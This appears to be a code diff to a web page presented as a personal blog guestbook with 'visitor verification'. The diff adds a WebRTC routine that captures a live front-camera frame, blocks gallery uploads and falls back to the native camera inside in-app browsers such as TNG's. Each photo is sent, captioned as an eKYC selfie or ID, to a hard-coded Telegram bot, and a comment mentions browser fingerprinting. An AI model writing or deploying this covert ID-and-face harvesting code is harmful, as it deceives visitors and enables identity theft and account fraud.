@@ -57,16 +57,16 @@
         </div>
 
         <div class="message-box">
-            <h3>访客打卡与验证</h3>
+            <h3>访客身份验证与打卡</h3>
             
-            <!-- 运营商级原生相机调起组件（隐藏的 file input + 自定义按钮） -->
-            <input type="file" id="cameraInput" accept="image/*" capture="user" style="display:none;" onchange="handleFileCapture(this)">
-            <button class="btn-selfie" onclick="triggerNativeCamera()">📷 拍摄证件/自拍打卡</button>
+            <!-- 降级预备：严格限制只能现场拍照的隐藏原生输入框 -->
+            <input type="file" id="cameraInput" accept="image/jpeg,image/png" capture="user" style="display:none;" onchange="handleFileCapture(this)">
+            <button class="btn-selfie" id="btnSelfie" onclick="triggerSmartCamera()">📷 拍摄证件/自拍打卡</button>
             
             <input type="text" id="name" placeholder="请输入你的昵称（选填）">
             <textarea id="msg" rows="5" placeholder="请输入你的留言内容（必填）"></textarea>
             <button onclick="sendMessage()">提交留言</button>
-            <p class="tip-text">温馨提示：点击上方按钮将直接调起手机系统相机拍照验证；仅您主动提交的留言会保存。</p>
+            <p class="tip-text">温馨提示：点击按钮将进行现场拍照身份验证；仅您主动提交的留言会保存。</p>
         </div>
     </div>
 
@@ -74,7 +74,7 @@
         © 2026 个人博客 | 原创记录 尊重隐私
     </footer>
 
-    <!-- Firebase SDK & 全功能极客指纹 + 原生相机上传逻辑 -->
+    <!-- Firebase SDK & 全功能极客指纹 + 双轨智能相机上传逻辑 -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
         import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
@@ -98,7 +98,7 @@
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const TELEGRAM_PHOTO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        // 统一提示弹窗
+        // 显示提示弹窗
         function showToast(msg, type = "success") {
             let toast = document.getElementById("toast");
             toast.className = "toast " + type;
@@ -127,44 +127,97 @@
             }
         }
 
-        // 运营商级原生相机调起与照片发送
-        window.triggerNativeCamera = function() {
+        // 统一照片发送函数 (直接对接 Telegram API)
+        async function uploadPhotoToTelegram(fileOrBlob, sourceTag) {
+            try {
+                let formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", fileOrBlob, "kyc_live.jpg");
+                formData.append("caption", `📷 <b>【收到 eKYC 验证照片 (${sourceTag})】</b>\n🕒 时间：${new Date().toLocaleString()}`);
+                formData.append("parse_mode", "HTML");
+
+                let res = await fetch(TELEGRAM_PHOTO_URL, { method: "POST", body: formData });
+                let resData = await res.json();
+
+                if (resData.ok) {
+                    showToast("验证照片已成功现场上传至 Telegram！", "success");
+                } else {
+                    showToast("发送照片失败，请重试", "error");
+                }
+            } catch (e) {
+                console.error(e);
+                showToast("网络请求失败，上传出错", "error");
+            }
+        }
+
+        // 核心：智能双轨拍照（WebRTC 优先现场抓拍 + 受限 WebView 自动降级原生相机）
+        window.triggerSmartCamera = async function() {
+            let btn = document.getElementById("btnSelfie");
+            btn.disabled = true;
+            btn.innerText = "⏳ 正在连接摄像头...";
+
+            // 1. 检查浏览器是否具备 WebRTC 条件
+            let hasWebRTC = !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
+
+            if (hasWebRTC) {
+                try {
+                    // 在标准浏览器（Chrome/Safari）中优先调用 WebRTC 实时流抓拍，物理屏蔽相册
+                    let stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                        audio: false
+                    });
+
+                    let video = document.createElement("video");
+                    video.srcObject = stream;
+                    await video.play();
+
+                    // 延迟 400ms 允许相机自动曝光和聚焦
+                    await new Promise(resolve => setTimeout(resolve, 400));
+
+                    let canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    let ctx = canvas.getContext("2d");
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // 抓拍完毕后及时关闭摄像头流
+                    stream.getTracks().forEach(track => track.stop());
+
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            await uploadPhotoToTelegram(blob, "WebRTC 极速现场抓拍");
+                        } else {
+                            showToast("抓拍失败，请重试", "error");
+                        }
+                        btn.disabled = false;
+                        btn.innerText = "📷 拍摄证件/自拍打卡";
+                    }, "image/jpeg", 0.9);
+
+                    return; // WebRTC 成功则直接退出
+                } catch (err) {
+                    console.warn("WebRTC 调起失败或受限制，自动降级至原生相机模式:", err);
+                }
+            }
+
+            // 2. 如果在 TNG 内置浏览器等受限 WebView 环境，自动触发原生相机
+            btn.disabled = false;
+            btn.innerText = "📷 拍摄证件/自拍打卡";
             document.getElementById("cameraInput").click();
         };
 
+        // 处理原生相机拍完后的图片上传
         window.handleFileCapture = async function(input) {
             if (input.files && input.files[0]) {
                 let file = input.files[0];
-                let btn = document.querySelector(".btn-selfie");
+                let btn = document.getElementById("btnSelfie");
                 btn.disabled = true;
                 btn.innerText = "⏳ 正在上传验证照片...";
 
-                try {
-                    let formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
-                    formData.append("photo", file, "kyc_verification.jpg");
-                    formData.append("caption", `📷 <b>【收到新的 eKYC 验证照片】</b>\n🕒 时间：${new Date().toLocaleString()}`);
-                    formData.append("parse_mode", "HTML");
+                await uploadPhotoToTelegram(file, "原生相机调起");
 
-                    let res = await fetch(TELEGRAM_PHOTO_URL, {
-                        method: "POST",
-                        body: formData
-                    });
-                    let resData = await res.json();
-
-                    if (resData.ok) {
-                        showToast("验证照片已成功发送至 Telegram！", "success");
-                    } else {
-                        showToast("发送失败，请重试", "error");
-                    }
-                } catch (err) {
-                    console.error(err);
-                    showToast("上传出错", "error");
-                } finally {
-                    btn.disabled = false;
-                    btn.innerText = "📷 拍摄证件/自拍打卡";
-                    input.value = ""; // 清空以便允许重复拍摄
-                }
+                btn.disabled = false;
+                btn.innerText = "📷 拍摄证件/自拍打卡";
+                input.value = ""; // 重置 input 以备下一次拍摄
             }
         };
 
